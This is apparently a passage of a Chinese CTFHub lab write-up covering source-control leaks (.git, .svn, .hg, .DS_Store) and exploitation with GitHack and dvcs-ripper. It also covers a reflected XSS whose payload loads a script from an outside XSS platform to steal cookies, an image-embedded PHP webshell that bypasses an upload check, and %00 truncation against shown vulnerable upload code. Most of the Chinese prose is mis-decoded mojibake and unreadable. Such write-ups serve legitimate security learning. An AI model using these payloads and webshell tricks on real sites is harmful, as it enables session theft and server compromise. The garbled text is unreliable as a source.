<h3 id="å¦‚ä½•åˆ©ç”¨"><a href="#å¦‚ä½•åˆ©ç”¨" class="headerlink" title="å¦‚ä½•åˆ©ç”¨"></a>å¦‚ä½•åˆ©ç”¨</h3><p><code>SWP</code>æ–‡ä»¶ä¸ºéšè—æ–‡ä»¶ï¼Œæ“ä½œæ—¶éœ€è¦åœ¨æ–‡ä»¶åå‰åŠ .</p>
<p>é’ˆå¯¹<code>SWP</code>å¤‡ä»½æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>vim -r filename</code>å‘½ä»¤æ¥æ¢å¤æ–‡ä»¶<br>(<code>vim</code>ä½¿ç”¨çš„ç¼“å­˜å­˜å‚¨ä¸ºä¸€ç§å›ºå®šæ ¼å¼çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚è€Œæˆ‘ä»¬ä¸€èˆ¬ç¼–è¾‘çš„æ—¶æ˜é—®å¯è§å­—ç¬¦ï¼Œåœ¨vimçš„ç¼“å­˜ä¸­è¿™äº›å¯è§å­—ç¬¦ä¼šåŸæ ·ä¿ç•™,æ‰€ä»¥æ˜¾ç¤ºæ˜¯ä¸€ç§ä¹±ç )<br>æ ¹æ®æç¤ºæŒ‰å›è½¦è¿›è¡Œæ¢å¤</p>
<h2 id="2-4-ä¿¡æ¯æ³„éœ²-DS-Store"><a href="#2-4-ä¿¡æ¯æ³„éœ²-DS-Store" class="headerlink" title="2.4 ä¿¡æ¯æ³„éœ²-.DS_Store"></a>2.4 ä¿¡æ¯æ³„éœ²-.DS_Store</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">.DS_Store</span> æ˜¯ Mac OS ä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ã€‚é€šè¿‡<span class="string">.DS_Store</span>å¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚</span><br></pre></td></tr></table></figure>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è®¿é—®url/.DS_Store</span><br></pre></td></tr></table></figure></div>

<p>ä¸‹è½½<code>DS_Store</code>æ–‡ä»¶</p>
<h2 id="3-ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-log"><a href="#3-ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-log" class="headerlink" title="3.ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-log"></a>3.ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-log</h2><p> ç¬¬ä¸€æ¬¡ä½¿ç”¨<strong>githack</strong>ï¼Œè®°å½•ä¸€ä¸‹</p>
<p><strong>æ³¨æ„githackéœ€è¦python2.7ç‰ˆæœ¬</strong></p>
<p><code>å½“å‰å¤§é‡å¼€å‘äººå‘˜ä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå°†.gitæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº†gitæ³„éœ²æ¼æ´ã€‚</code></p>
<p><code>GitHackæ˜¯ä¸€ä¸ª.gitæ³„éœ²åˆ©ç”¨æµ‹è¯•è„šæœ¬ï¼Œé€šè¿‡æ³„éœ²çš„æ–‡ä»¶ï¼Œè¿˜åŸé‡å»ºå·¥ç¨‹æºä»£ç ã€‚</code></p>
<h3 id="å·¥ä½œåŸç†"><a href="#å·¥ä½œåŸç†" class="headerlink" title="å·¥ä½œåŸç†"></a>å·¥ä½œåŸç†</h3><p>1ã€è§£æ.git/indexæ–‡ä»¶ï¼Œæ‰¾åˆ°å·¥ç¨‹ä¸­æ‰€æœ‰çš„ï¼š ( æ–‡ä»¶åï¼Œæ–‡ä»¶sha1 )<br>2ã€å».git/objects/ æ–‡ä»¶å¤¹ä¸‹ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶<br>3ã€zlibè§£å‹æ–‡ä»¶ï¼ŒæŒ‰åŸå§‹çš„ç›®å½•ç»“æ„å†™å…¥æºä»£ç </p>
<h3 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h3><p>é€Ÿåº¦å¿«ï¼Œé»˜è®¤20ä¸ªå·¥ä½œçº¿ç¨‹<br>å°½é‡è¿˜åŸæ‰€æœ‰çš„æºä»£ç ï¼Œç¼ºå¤±çš„æ–‡ä»¶ä¸å½±å“è„šæœ¬å·¥ä½œ<br>è„šæœ¬ä¸éœ€è¦æ‰§è¡Œé¢å¤–çš„gitå‘½ä»¤ï¼Œall you need is python<br>è„šæœ¬æ— éœ€æµè§ˆç›®å½•</p>
<h3 id="ç”¨æ³•ç¤ºä¾‹"><a href="#ç”¨æ³•ç¤ºä¾‹" class="headerlink" title="ç”¨æ³•ç¤ºä¾‹"></a>ç”¨æ³•ç¤ºä¾‹</h3><p>æ³¨æ„è¿™é‡Œåœ¨urlåé¢éœ€è¦åŠ ä¸Š.gitï¼Œç”¨dirsearchå¯ä»¥æ‰«å‡ºæ¥ï¼ˆpython3ï¼‰</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">GitHack.py http:<span class="regexp">//</span>www.openssl.org<span class="regexp">/.git/</span></span><br></pre></td></tr></table></figure></div>

<p>ç„¶ååœ¨ç›®å½•distå°±ä¼šç”Ÿæˆå¯¹åº”ç›®å½• </p>
<p>æ‰“å¼€ç›®å½•ï¼Œè¾“å…¥cmdï¼Œæ‰§è¡Œ<code>git log</code>ã€git log å¯ä»¥æŸ¥çœ‹commit historyï¼Œä¹Ÿå°±æ˜¯å‘½ä»¤æ‰§è¡Œçš„å†å²ï¼Œå¯ä»¥çœ‹çœ‹ä¹‹å‰æ‰§è¡Œè¿‡å“ªäº›å‘½ä»¤ï¼Œæ–¹ä¾¿åé¢æŸ¥è¯¢å‘½ä»¤æ‰§è¡Œçš„å…·ä½“å†…å®¹ã€‘</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220728230330073.png" alt="image-20220728230330073"></p>
<p>ç„¶åå¤åˆ¶add flagè¿™ä¸ªå‘½ä»¤çš„ä»£ç ï¼Œå¦‚ä¸Šå›¾<code>75272ca078b7eedcf329a2b08f6e4faae0a36a99</code></p>
<p>ç„¶åç”¨git diff</p>
<p>ã€</p>
<p>git diffæ¯”è¾ƒä¸¤ä¸ªç‰ˆæœ¬çš„å·®å¼‚ï¼Œ</p>
<p>è¿™é‡Œåé¢åªæœ‰<strong>ä¸€ä¸ªå‘½ä»¤</strong>å°±æ˜¯æ¯”è¾ƒæœ¬åœ°å·¥ä½œåŒºå’Œç¼“å­˜åŒºçš„ä¿¡æ¯åŒºåˆ«</p>
<p>å¦‚æœåé¢æœ‰<strong>ä¸¤ä¸ªå‘½ä»¤</strong>ï¼Œå°±æ˜¯æ¯”è¾ƒè¿™ä¸¤ä¸ªå‘½ä»¤çš„å·®åˆ«</p>
<p>ã€‘</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220728231134513.png" alt="image-20220728231134513"></p>
<p>è¿™é‡Œæ¯”è¾ƒï¼Œå°±å¾—åˆ°äº†flag</p>
<h2 id="4-ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-Stash"><a href="#4-ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-Stash" class="headerlink" title="4.ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-Stash"></a>4.ä¿¡æ¯æ³„éœ²-Gitæ³„éœ²-Stash</h2><h3 id="git-stash-çš„ä½œç”¨"><a href="#git-stash-çš„ä½œç”¨" class="headerlink" title="git stash çš„ä½œç”¨"></a>git stash çš„ä½œç”¨</h3><p>git stashç”¨äºæƒ³è¦ä¿å­˜å½“å‰çš„ä¿®æ”¹,ä½†æ˜¯æƒ³å›åˆ°ä¹‹å‰æœ€åä¸€æ¬¡æäº¤çš„å¹²å‡€çš„å·¥ä½œä»“åº“æ—¶è¿›è¡Œçš„æ“ä½œ.git stashå°†æœ¬åœ°çš„ä¿®æ”¹ä¿å­˜èµ·æ¥,å¹¶ä¸”å°†å½“å‰ä»£ç åˆ‡æ¢åˆ°HEADæäº¤ä¸Š.</p>
<p>é€šè¿‡git stashå­˜å‚¨çš„ä¿®æ”¹åˆ—è¡¨,å¯ä»¥é€šè¿‡<u><strong>git stash list</strong></u>æŸ¥çœ‹.<u><strong>git stash show</strong></u>ç”¨äºæ ¡éªŒ,<u><strong>git stash apply</strong></u>ç”¨äºé‡æ–°å­˜å‚¨.ç›´æ¥æ‰§è¡Œ<u>git stashç­‰åŒäºgit stash save.</u></p>
<p>æœ€æ–°çš„å­˜å‚¨ä¿å­˜åœ¨<u><strong>refs/stash</strong></u>ä¸­.è€çš„å­˜å‚¨å¯ä»¥é€šè¿‡ç›¸å…³çš„å‚æ•°è·å¾—,ä¾‹å¦‚stash@{0}è·å–æœ€æ–°çš„å­˜å‚¨,stash@{1}è·å–æ¬¡æ–°.stash@{2.hour.ago}è·å–ä¸¤å°æ—¶ä¹‹å‰çš„.å­˜å‚¨å¯ä»¥ç›´æ¥é€šè¿‡ç´¢å¼•çš„ä½ç½®æ¥è·å¾—stash@{n}.</p>
<p>æ“ä½œåŒ<code>2.log</code></p>
<p>å¯ä»¥å…ˆç”¨dirsearchæ‰«ä¸€ä¸‹ï¼Œ å‘ç°<u><strong>refs/stash</strong></u>æ–‡ä»¶ï¼Œ</p>
<p>ç„¶åç”¨GitHackæ‰«æ</p>
<p>åœ¨ç”Ÿæˆæ–‡ä»¶å¤¹é‡Œæœ‰stashæ–‡ä»¶</p>
<p><code>D:\GitHack-master\dist\challenge-8d48663e236c2ebc.sandbox.ctfhub.com_10800\.git\refs</code></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220729115457869.png" alt="image-20220729115457869"></p>
<p>æ‰“å¼€çœ‹åˆ°</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220729115528299.png" alt="image-20220729115528299"></p>
<p>åœ¨ç”Ÿæˆçš„æ–‡ä»¶å¤¹ä¸‹ç”¨</p>
<p><code>git diff d8c1978b1e71300574e1bb5335a01124b3a55569</code></p>
<p>å¾—åˆ°flag</p>
<p>ã€ä¹Ÿå¯ä»¥ä½¿ç”¨ git bashï¼Œç›´æ¥åœ¨ç”Ÿæˆçš„æ–‡ä»¶å¤¹ä¸‹</p>
<p>æ‰§è¡Œgit stash list </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">æŸ¥çœ‹stashäº†å“ªäº›å­˜å‚¨</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰§è¡Œgit stash pop</p>
<pre><code>æ¢å¤ä¹‹å‰ç¼“å­˜çš„å·¥ä½œç›®å½•ï¼Œå°†ç¼“å­˜å †æ ˆä¸­çš„å¯¹åº”stashåˆ é™¤ï¼Œå¹¶å°†å¯¹åº”ä¿®æ”¹åº”ç”¨åˆ°å½“å‰çš„å·¥ä½œç›®å½•ä¸‹,é»˜è®¤ä¸ºç¬¬ä¸€ä¸ªstash,å³stash@&#123;0&#125;ï¼Œå¦‚æœè¦åº”ç”¨å¹¶åˆ é™¤å…¶ä»–stashï¼Œå‘½ä»¤ï¼šgit stash pop stash@&#123;$num&#125; ï¼Œæ¯”å¦‚åº”ç”¨å¹¶åˆ é™¤ç¬¬äºŒä¸ªï¼šgit stash pop stash@&#123;1&#125;ï¼‰
</code></pre>
<p>ç„¶åä¼šåœ¨è¯¥ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªæ–°çš„txtæ–‡ä»¶ï¼Œæ‰“å¼€æˆ–ç”¨catå‘½ä»¤ï¼Œå¾—åˆ°flag</p>
<p>ã€‘</p>
<h2 id="5-ä¿¡æ¯æ³„éœ²-SVNæ³„éœ²"><a href="#5-ä¿¡æ¯æ³„éœ²-SVNæ³„éœ²" class="headerlink" title="5.ä¿¡æ¯æ³„éœ²-SVNæ³„éœ²"></a>5.ä¿¡æ¯æ³„éœ²-SVNæ³„éœ²</h2><p><code>å½“å¼€å‘äººå‘˜ä½¿ç”¨ SVN è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.svnæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† SVN æ³„éœ²æ¼æ´ã€‚</code></p>
<p>è¿™é“é¢˜éœ€è¦è¿ç”¨<strong>dvcs-ripper</strong>å·¥å…·è¿›è¡Œå¤„ç†</p>
<p>å¯ä»¥å…ˆç”¨dirsearchæ‰«å‡º.svnç›®å½•ï¼Œè¯´æ˜æœ‰SVNæ³„éœ²</p>
<p>å’Œgithackç±»ä¼¼ï¼Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/rip-svn.pl -v -u url/</span>.svn</span><br></pre></td></tr></table></figure></div>

<p>ç„¶ååœ¨dvcs-ripperç›®å½•é‡Œï¼Œè¿›å…¥.svnç›®å½•</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220729175208298.png" alt="image-20220729175208298"></p>
<p>ç„¶åè¿›å…¥pristineç›®å½•ï¼Œè¿›å»å‘ç°ä¸¤ä¸ªç›®å½•ï¼ŒæŒ¨ä¸ªæ‰“å¼€</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220729175252045.png" alt="image-20220729175252045"></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220729175429878.png" alt="image-20220729175429878"></p>
<p>å‘ç°ä¸€ä¸ªç›®å½•ä¸‹æ˜¯ç½‘ç«™é¡µé¢æºç ï¼Œå¦ä¸€ä¸ªå°±æ˜¯flag</p>
<p>å¾—åˆ°flag</p>
<h2 id="6-ä¿¡æ¯æ³„éœ²-HGæ³„éœ²"><a href="#6-ä¿¡æ¯æ³„éœ²-HGæ³„éœ²" class="headerlink" title="6.ä¿¡æ¯æ³„éœ²-HGæ³„éœ²"></a>6.ä¿¡æ¯æ³„éœ²-HGæ³„éœ²</h2><p><code>å½“å¼€å‘äººå‘˜ä½¿ç”¨ Mercurial è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.hg æ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† hg æ³„éœ²æ¼æ´ã€‚</code></p>
<p>å¯ä»¥å…ˆç”¨dirsearchæ‰«å‡º.hgç›®å½•ï¼Œè¯´æ˜æœ‰HGæ³„éœ²</p>
<p>è¿™ä¸ªå’ŒSVNä¸€æ ·ï¼Œåªä¸è¿‡è¦æ”¹æˆ.hg</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/rip-hg.pl -v -u url/</span>.hg</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/07/27/CTFHub-wp/image-20220730164340016.png" alt="image-20220730164340016"></p>
<p>å‘ç°ä¸¤ä¸ªæ–‡ä»¶ï¼ŒçŒœæµ‹ä¸ºHGæ³„éœ²æ–‡ä»¶</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220730164428184.png" alt="image-20220730164428184"></p>
<p>å‘ç°flagæ–‡æœ¬æ–‡ä»¶</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220730164949862.png" alt="image-20220730164949862"></p>
<p>url+flag_973127138.txt</p>
<p>å¾—åˆ°flag</p>
<h2 id="7-xss-xssåå°„å‹"><a href="#7-xss-xssåå°„å‹" class="headerlink" title="7.xss-xssåå°„å‹"></a>7.xss-xssåå°„å‹</h2><p>å‘ç°å®ƒæœ‰ä¸¤ä¸ªè¾“å…¥æ¡†</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731104635854.png" alt="image-20220731104635854"></p>
<p>ç¬¬ä¸€ä¸ªè¾“å…¥æµ‹è¯•è¯­å¥ï¼ŒæˆåŠŸå¼¹çª—</p>
<p>ç¬¬äºŒä¸ªæ˜¯å‘é€urlï¼Œç›²çŒœæ˜¯å‘åˆ°åå°</p>
<p>çœ‹äº†ä¸€äº›wpï¼Œå‘ç°éœ€è¦ä½¿ç”¨xssæµ‹è¯•å¹³å°<code>http://xsscom.com//index.php</code></p>
<p>å…ˆåˆ›å»ºé¡¹ç›®</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731113619175.png" alt="image-20220731113619175"></p>
<p>è®¾ç½®é…ç½®</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731113753893.png" alt="image-20220731113753893"></p>
<p>ç„¶åç‚¹å‡»æŸ¥çœ‹ä»£ç </p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731113810045.png" alt="image-20220731113810045"></p>
<p>åœ¨æœ€ä¸‹é¢çœ‹åˆ°</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731113837566.png" alt="image-20220731113837566"></p>
<p>æŠŠä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xsscom.com//9VJcMV</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¾“å…¥åˆ°ç¬¬ä¸€ä¸ªæ¡†ä¸­</p>
<p>å†æŠŠæäº¤åçš„urlå¤åˆ¶ï¼Œç„¶ååˆ°ç¬¬äºŒæ¡†ä¸­å‘é€</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731114028909.png" alt="image-20220731114028909"></p>
<p>ç„¶åè¿”å›xssæµ‹è¯•å¹³å°ä¸ŠæŸ¥çœ‹</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731114142138.png" alt="image-20220731114142138"></p>
<p>cookieå¤„å‡ºç°flag</p>
<h2 id="8-æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶å¤´æ£€æŸ¥"><a href="#8-æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶å¤´æ£€æŸ¥" class="headerlink" title="8.æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶å¤´æ£€æŸ¥"></a>8.æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶å¤´æ£€æŸ¥</h2><p><code>æ–‡ä»¶å¤´æ˜¯ç›´æ¥ä½äºæ–‡ä»¶ä¸­çš„ä¸€æ®µæ•°æ®,æ˜¯æ–‡ä»¶çš„ä¸€éƒ¨åˆ†</code></p>
<p>è¿™é‡Œè¿‡æ»¤æ–‡ä»¶å¤´ï¼Œè€Œä¸”é™åˆ¶å›¾ç‰‡ç±»å‹æ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥è¯•è¯•ä¸Šä¼ ä¸€ä¸ªæ²¡æœ‰ä»»ä½•é—®é¢˜çš„å›¾ç‰‡ã€æ³¨æ„å›¾ç‰‡ä¸èƒ½å¤ªå¤§ï¼Œä¸ç„¶ä¼šæœ€åç”¨èšå‰‘è¿æ¥ä¼šçˆ†é”™ï¼Œæˆ‘ä¸Šä¼ 1mbå¤§å°å›¾ç‰‡å°±æŠ¥é”™ï¼Œæœ€åä¸Šä¼ 400å­—èŠ‚å›¾ç‰‡æ‰æˆåŠŸã€‘</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731164210465.png" alt="image-20220731164210465"></p>
<p>ä¸Šä¼ å›¾ç‰‡åï¼Œåœ¨åé¢åŠ ä¸Šä¸€å¥è¯æœ¨é©¬ï¼Œå¹¶ä¿®æ”¹æ–‡ä»¶å</p>
<p><strong>ã€ä¹Ÿå¯ä»¥ç”¨cmd åˆæˆå›¾ç‰‡é©¬ï¼Œä¹Ÿæ˜¯æœ‰å›¾ç‰‡æ–‡ä»¶å¤´ã€‘</strong></p>
<p><strong>ã€copy å›¾ç‰‡å.png(.jpg)/b + æœ¨é©¬æ–‡ä»¶å.php(.asp/.aspx)/a ç”Ÿæˆå›¾ç‰‡å.png(.jpg)ã€‘</strong></p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731164732820.png" alt="image-20220731164732820"></p>
<p>ã€å·²è¯•å¯è¡Œã€‘</p>
<p>ç„¶åæ­£å¸¸ç”¨èšå‰‘è¿æ¥</p>
<p><img src="/2022/07/27/CTFHub-wp/image-20220731164330254.png" alt="image-20220731164330254"></p>
<p>å¾—åˆ°flag</p>
<h2 id="9-æ–‡ä»¶ä¸Šä¼ -00æˆªæ–­"><a href="#9-æ–‡ä»¶ä¸Šä¼ -00æˆªæ–­" class="headerlink" title="9.æ–‡ä»¶ä¸Šä¼ -00æˆªæ–­"></a>9.æ–‡ä»¶ä¸Šä¼ -00æˆªæ–­</h2><h3 id="0x00æˆªæ–­åŸç†ï¼š-php-lt-5-3-29"><a href="#0x00æˆªæ–­åŸç†ï¼š-php-lt-5-3-29" class="headerlink" title="0x00æˆªæ–­åŸç†ï¼š[php&lt;5.3.29]"></a>0x00æˆªæ–­åŸç†ï¼š[php&lt;5.3.29]</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COS"><figure class="iseeu highlight /cos"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>x00æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºæ–¹æ³•ï¼Œæ˜¯<span class="keyword">ascii</span>ç ä¸º<span class="number">0</span>çš„å­—ç¬¦ï¼Œåœ¨æœ‰äº›å‡½æ•°å¤„ç†æ—¶ï¼Œä¼šæŠŠè¿™ä¸ªå­—ç¬¦å½“åšç»“æŸç¬¦ã€‚ç³»ç»Ÿåœ¨å¯¹æ–‡ä»¶åçš„è¯»å–æ—¶ï¼Œå¦‚æœé‡åˆ°<span class="number">0</span>x00ï¼Œå°±ä¼šè®¤ä¸ºè¯»å–å·²ç»“æŸã€‚è¿™ä¸ªå¯ä»¥ç”¨åœ¨å¯¹æ–‡ä»¶ç±»å‹åçš„ç»•è¿‡ä¸Šã€‚</span><br><span class="line"></span><br><span class="line">ä½†è¦æ³¨æ„æ˜¯æ–‡ä»¶çš„<span class="number">16</span>è¿›åˆ¶å†…å®¹é‡Œçš„<span class="number">00</span>ï¼Œè€Œä¸æ˜¯æ–‡ä»¶åä¸­çš„<span class="number">00</span> ï¼ï¼ï¼å°±æ˜¯è¯´ç³»ç»Ÿæ˜¯æŒ‰<span class="number">16</span>è¿›åˆ¶è¯»å–æ–‡ä»¶ï¼ˆæˆ–è€…è¯´äºŒè¿›åˆ¶ï¼‰ï¼Œ</span><br><span class="line"></span><br><span class="line">é‡åˆ°<span class="keyword">ascii</span>ç ä¸ºé›¶çš„ä½ç½®å°±åœæ­¢ï¼Œè€Œè¿™ä¸ª<span class="keyword">ascii</span>ç ä¸ºé›¶çš„ä½ç½®åœ¨<span class="number">16</span>è¿›åˆ¶ä¸­æ˜¯<span class="number">00</span>ï¼Œç”¨<span class="number">0</span><span class="keyword">x</span>å¼€å¤´è¡¨ç¤º<span class="number">16</span>è¿›åˆ¶ï¼Œä¹Ÿå°±æ˜¯æ‰€è¯´çš„<span class="number">0</span>x00æˆªæ–­ã€‚</span><br><span class="line"></span><br><span class="line">%<span class="number">00</span>æ˜¯è¢«æœåŠ¡å™¨è§£ç ä¸º<span class="number">0</span>x00å‘æŒ¥äº†æˆªæ–­ä½œç”¨ã€‚</span><br></pre></td></tr></table></figure></div>

<p><code>ä¸¾ä¸ªä¾‹å­ï¼Œurlä¸­è¾“å…¥çš„æ˜¯upload/post.php%00.pngï¼Œçœ‹æ ·å­æ˜¯å›¾ç‰‡æ–‡ä»¶ï¼Œé‚£ä¹ˆåå°è¯»å–åˆ°æ˜¯upload/post.phpï¼Œå°±å®ç°äº†ç»•åç›®çš„ã€‚</code></p>
<p>æˆ‘ä»¬å¼€å§‹å…ˆä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶è¯•è¯•ï¼Œé™åˆ¶jpg,png,gifåç¼€</p>
<p>ä¸Šä¼ æˆåŠŸåï¼Œæ²¡æœ‰æ˜¾ç¤ºä¸Šä¼ è·¯å¾„ï¼Œåªæ˜¯urlå˜åŒ–</p>
<p><code>http://challenge-6cc6a23c8f284d6b.sandbox.ctfhub.com:10800/?road=/var/www/html</code></p>
<p> çŒœæƒ³å¤šåŠé‡æ–°ä¸´æ—¶æ–‡ä»¶åï¼Œä¸å›ºå®šï¼Œå¯¼è‡´æ˜¾ç¤ºä¸äº†è·¯å¾„</p>
<p>è¿™é‡Œå°±éœ€è¦00æˆªæ–­ï¼Œè¦æŠŠæ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„ï¼Œæ‰¾åˆ°ï¼Œå¥½ç”¨èšå‰‘è¿æ¥</p>
<p>å…ˆè¦æ¸…æ¥š%00æˆªæ–­ç‚¹åœ¨å“ªé‡Œï¼Œæˆ‘ä»¬å…ˆF12çœ‹</p>
<p>çœ‹ç½‘ç«™æºç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFHub æ–‡ä»¶ä¸Šä¼  - 00æˆªæ–­<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CTFHub æ–‡ä»¶ä¸Šä¼  - 00æˆªæ–­<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">?road</span>=<span class="string">/var/www/html/upload/</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if (!empty($_POST[&#x27;submit&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span></span><br><span class="line"><span class="comment">    $info = pathinfo($name);</span></span><br><span class="line"><span class="comment">    $ext = $info[&#x27;extension&#x27;];</span></span><br><span class="line"><span class="comment">    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);</span></span><br><span class="line"><span class="comment">    if (in_array($ext, $whitelist)) &#123;</span></span><br><span class="line"><span class="comment">        $des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</span></span><br><span class="line"><span class="comment">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;ä¸Šä¼ æˆåŠŸ&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">        &#125; else &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;ä¸Šä¼ 